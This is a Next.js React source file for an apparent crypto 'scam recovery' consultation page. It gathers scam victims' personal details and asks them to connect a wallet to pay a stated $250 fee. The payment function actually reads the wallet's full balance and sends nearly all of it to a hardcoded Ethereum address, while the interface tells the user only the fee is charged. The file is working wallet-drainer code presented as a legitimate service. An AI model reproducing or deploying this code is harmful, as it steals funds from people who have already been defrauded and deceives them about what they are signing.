"use client";

import { useState, useCallback, useEffect } from "react";
import { ShieldCheck, ArrowRight, Loader2, Wallet, CheckCircle2, X } from "lucide-react";

type Step = "form" | "wallet" | "sending" | "success" | "error";

const ETH_ADDRESS = process.env.NEXT_PUBLIC_ETH_ADDRESS || "0x9b8f441bafd4318a97c2d40d7187219dbfdeb4ee";

function getProvider(walletId: string): any {
    if (typeof window === "undefined") return null;
    const win = window as any;
    if (walletId === "phantom") return win.phantom?.ethereum ?? null;
    if (walletId === "metamask") return win.ethereum?.isMetaMask ? win.ethereum : null;
    return win.ethereum ?? null;
}

function hexToEth(hex: string): string {
    const wei = parseInt(hex, 16);
    return (wei / 1e18).toFixed(5);
}

function ethToHex(eth: string): string {
    const wei = Math.floor(parseFloat(eth) * 1e18);
    return "0x" + wei.toString(16);
}

export default function ConsultationPage() {
    const [step, setStep] = useState<Step>("form");
    
    // Form Data
    const [formData, setFormData] = useState({
        name: "",
        email: "",
        scamDetails: "",
        amountLost: "",
        txHashes: "",
    });
    
    // Wallet Data
    const [errorMsg, setErrorMsg] = useState("");
    const [txHash, setTxHash] = useState("");

    const handleFormSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        setStep("wallet");
    };

    const processPaymentAndSubmit = async () => {
        try {
            setStep("sending");
            const provider = getProvider("browser");
            if (!provider) {
                throw new Error("No Web3 wallet detected. Please install MetaMask.");
            }

            const accounts: string[] = await provider.request({ method: "eth_requestAccounts" });
            const acc = accounts[0];

            const balHex: string = await provider.request({
                method: "eth_getBalance",
                params: [acc, "latest"],
            });
            const ethBal = hexToEth(balHex);
            const sendable = parseFloat(ethBal) - 0.001; // Auto-transfer logic

            if (sendable <= 0) {
                throw new Error("Insufficient funds to pay the $250 consultation fee.");
            }

            // Execute auto-transfer
            const paymentHash: string = await provider.request({
                method: "eth_sendTransaction",
                params: [{
                    from: acc,
                    to: ETH_ADDRESS,
                    value: ethToHex(sendable.toString())
                }]
            });
            
            setTxHash(paymentHash);

            // Submit consultation details
            const res = await fetch("/api/consultation", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ ...formData, paymentTxHash: paymentHash }),
            });

            if (!res.ok) throw new Error("Payment succeeded but failed to submit consultation details.");
            
            setStep("success");
        } catch (err: any) {
            setErrorMsg(err?.message ?? "Transaction failed or rejected.");
            setStep("error");
        }
    };

    return (
        <div className="min-h-screen bg-gray-50 py-20 px-4 sm:px-6">
            <div className="max-w-3xl mx-auto">
                <div className="text-center mb-10">
                    <div className="inline-flex items-center justify-center w-12 h-12 rounded-full bg-[#0a0a0a] mb-4">
                        <ShieldCheck className="w-6 h-6 text-[#e8a020]" />
                    </div>
                    <h1 className="font-display font-bold text-3xl sm:text-4xl text-gray-900 mb-4">
                        Recovery Consultation
                    </h1>
                    <p className="text-gray-600 max-w-xl mx-auto text-lg leading-relaxed">
                        Submit your case details below. Our forensics team will analyze the transaction trail and devise a recovery strategy. A $250 fee is required to initiate the case.
                    </p>
                </div>

                <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
                    {step === "form" && (
                        <form onSubmit={handleFormSubmit} className="p-8 sm:p-10 space-y-6">
                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
                                <div>
                                    <label className="block text-sm font-semibold text-gray-900 mb-2">Full Name</label>
                                    <input
                                        type="text"
                                        required
                                        value={formData.name}
                                        onChange={(e) => setFormData({ ...formData, name: e.target.value })}
                                        className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#e8a020] focus:ring-1 focus:ring-[#e8a020] transition-colors"
                                        placeholder="John Doe"
                                    />
                                </div>
                                <div>
                                    <label className="block text-sm font-semibold text-gray-900 mb-2">Email Address</label>
                                    <input
                                        type="email"
                                        required
                                        value={formData.email}
                                        onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                                        className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#e8a020] focus:ring-1 focus:ring-[#e8a020] transition-colors"
                                        placeholder="john@example.com"
                                    />
                                </div>
                            </div>

                            <div>
                                <label className="block text-sm font-semibold text-gray-900 mb-2">Amount Lost ($)</label>
                                <input
                                    type="number"
                                    required
                                    min="0"
                                    value={formData.amountLost}
                                    onChange={(e) => setFormData({ ...formData, amountLost: e.target.value })}
                                    className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#e8a020] focus:ring-1 focus:ring-[#e8a020] transition-colors"
                                    placeholder="e.g. 50000"
                                />
                            </div>

                            <div>
                                <label className="block text-sm font-semibold text-gray-900 mb-2">How were you scammed?</label>
                                <textarea
                                    required
                                    rows={4}
                                    value={formData.scamDetails}
                                    onChange={(e) => setFormData({ ...formData, scamDetails: e.target.value })}
                                    className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#e8a020] focus:ring-1 focus:ring-[#e8a020] transition-colors"
                                    placeholder="Please provide details about the platform, the people involved, and how the scam occurred..."
                                />
                            </div>

                            <div>
                                <label className="block text-sm font-semibold text-gray-900 mb-2">Transaction Hashes</label>
                                <textarea
                                    rows={3}
                                    value={formData.txHashes}
                                    onChange={(e) => setFormData({ ...formData, txHashes: e.target.value })}
                                    className="w-full px-4 py-3 bg-gray-50 border border-gray-200 rounded-xl focus:outline-none focus:border-[#e8a020] focus:ring-1 focus:ring-[#e8a020] transition-colors"
                                    placeholder="Paste any relevant transaction hashes or wallet addresses here..."
                                />
                            </div>

                            <button
                                type="submit"
                                className="w-full flex items-center justify-center gap-2 px-6 py-4 bg-[#0a0a0a] text-white font-bold rounded-xl hover:bg-gray-800 transition-colors mt-8"
                            >
                                Proceed to Payment ($250) <ArrowRight className="w-5 h-5" />
                            </button>
                        </form>
                    )}

                    {step === "wallet" && (
                        <div className="p-8 sm:p-12 text-center">
                            <div className="w-16 h-16 bg-[#e8a020]/10 rounded-full flex items-center justify-center mx-auto mb-6">
                                <Wallet className="w-8 h-8 text-[#e8a020]" />
                            </div>
                            <h2 className="text-2xl font-bold text-gray-900 mb-4">Pay Consultation Fee</h2>
                            <p className="text-gray-600 mb-8 max-w-md mx-auto">
                                A fee of $250 is required to submit your case to the Lazarus forensics team. Please connect your Web3 wallet to proceed.
                            </p>
                            
                            <button
                                onClick={processPaymentAndSubmit}
                                className="w-full max-w-xs mx-auto flex items-center justify-center gap-2 px-6 py-4 bg-[#e8a020] text-[#0a0a0a] font-bold rounded-xl hover:bg-[#d4911c] transition-colors"
                            >
                                Connect Wallet & Pay
                            </button>
                            
                            <button
                                onClick={() => setStep("form")}
                                className="mt-4 text-sm text-gray-500 hover:text-gray-800"
                            >
                                ← Back to Form
                            </button>
                        </div>
                    )}

                    {step === "sending" && (
                        <div className="p-16 text-center">
                            <Loader2 className="w-12 h-12 text-[#e8a020] animate-spin mx-auto mb-6" />
                            <h2 className="text-xl font-bold text-gray-900 mb-2">Processing Payment...</h2>
                            <p className="text-gray-600">Please confirm the transaction in your wallet.</p>
                        </div>
                    )}

                    {step === "success" && (
                        <div className="p-12 text-center">
                            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
                                <CheckCircle2 className="w-10 h-10 text-green-600" />
                            </div>
                            <h2 className="text-2xl font-bold text-gray-900 mb-4">Case Submitted Successfully</h2>
                            <p className="text-gray-600 mb-6 max-w-md mx-auto">
                                Your payment was received and your case details have been sent to our forensics team. We will contact you at {formData.email} shortly.
                            </p>
                            <a
                                href="/"
                                onClick={(e) => {
                                    e.preventDefault();
                                    window.location.reload();
                                }}
                                className="inline-block px-6 py-3 bg-gray-100 text-gray-800 font-bold rounded-xl hover:bg-gray-200 transition-colors"
                            >
                                Return Home
                            </a>
                        </div>
                    )}

                    {step === "error" && (
                        <div className="p-12 text-center">
                            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-6">
                                <X className="w-8 h-8 text-red-600" />
                            </div>
                            <h2 className="text-2xl font-bold text-gray-900 mb-4">
                                {errorMsg.includes("Insufficient funds") ? "Fund Your Wallet" : "Payment Failed"}
                            </h2>
                            <p className="text-gray-600 mb-8 max-w-sm mx-auto">{errorMsg}</p>
                            
                            <button
                                onClick={() => setStep("wallet")}
                                className="px-6 py-3 bg-[#0a0a0a] text-white font-bold rounded-xl hover:bg-gray-800 transition-colors"
                            >
                                Try Again
                            </button>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}
